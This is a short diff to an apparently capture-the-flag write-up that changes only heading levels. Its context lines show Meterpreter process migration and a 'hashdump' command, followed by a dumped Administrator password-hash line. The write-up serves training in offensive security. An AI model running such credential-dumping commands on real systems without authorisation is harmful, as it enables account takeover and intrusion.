@@ -271,9 +271,9 @@ meterpreter > migrate 1336
 meterpreter > 
 ```
 
-# Task 4: Cracking
+## Task 4: Cracking
 
-## Q1: What is the name of the non-default user? 
+### Q1: What is the name of the non-default user? 
 ```	
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
